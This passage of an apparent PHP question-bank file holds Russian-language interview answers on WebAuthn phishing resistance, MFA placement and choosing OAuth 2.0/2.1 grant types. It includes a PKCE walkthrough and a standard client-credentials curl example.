**Главное преимущество `WebAuthn`:** ключ подписывает запрос **с указанием домена**. Фишинговая страница `bank-evil.com` не получит валидную подпись для `bank.com`. **Невозможно зафишить**.

**Где обязателен MFA:** админ-панели, доступ к продакшену, банки, корп-аккаунты. Для обычного юзера — `TOTP`/passkey по умолчанию + recovery codes.',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Какие grant types в OAuth 2.0 актуальны и как выбрать нужный?',
                'answer' => 'OAuth 2.1 (draft, фактический стандарт сегодня) **сократил** набор: убрал `Implicit` и `ROPC`, **сделал `PKCE` обязательным** для всех клиентов.

**Актуальные grant types:**

| Grant | Когда брать | Пример |
|---|---|---|
| **Authorization Code + `PKCE`** | веб-приложение, SPA, mobile с юзером | «Login with Google» |
| **Client Credentials** | server-to-server, без юзера | cron вызывает чужой API |
| **Refresh Token** | продление сессии без перелогина | мобильное приложение через неделю |
| **Device Authorization Grant** | устройства без удобного ввода | Smart TV, CLI, IoT |

**Устаревшие (НЕ использовать):**

| Grant | Почему устарел |
|---|---|
| **Implicit** | токен в `URL fragment` → утечка в `Referer`, history, server logs. Заменён **Code + PKCE** для SPA |
| **Resource Owner Password Credentials (`ROPC`)** | юзер отдаёт пароль **самому приложению** — нарушает идею делегирования |

**Authorization Code + PKCE — выбор по умолчанию:**
1. Client генерирует `code_verifier` (random `43–128` chars) и `code_challenge = SHA256(verifier)`
2. Redirect на `/authorize?response_type=code&code_challenge=...&code_challenge_method=S256`
3. Юзер логинится → редирект с `?code=abc`
4. Client шлёт `POST /token` с `code` + **`code_verifier`** (не challenge)
5. Server проверяет `SHA256(verifier) == challenge` → выдаёт токены

**PKCE защищает от** перехвата `code` (mobile redirect intent hijacking, malicious browser extension).

**Client Credentials:**
```bash
curl -X POST https://auth.example.com/oauth/token \
  -d "grant_type=client_credentials" \
  -d "client_id=$ID" \
  -d "client_secret=$SECRET" \
  -d "scope=orders.read"
```

**Device Code flow:** устройство показывает короткий код (`ABCD-1234`) и URL, юзер открывает его на телефоне, авторизует — устройство периодически опрашивает `/token`.

**Правило выбора:** есть юзер + браузер? → **Code + PKCE**. Нет юзера? → **Client Credentials**. Нет браузера, но есть юзер? → **Device Code**.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
        ];
    }
}
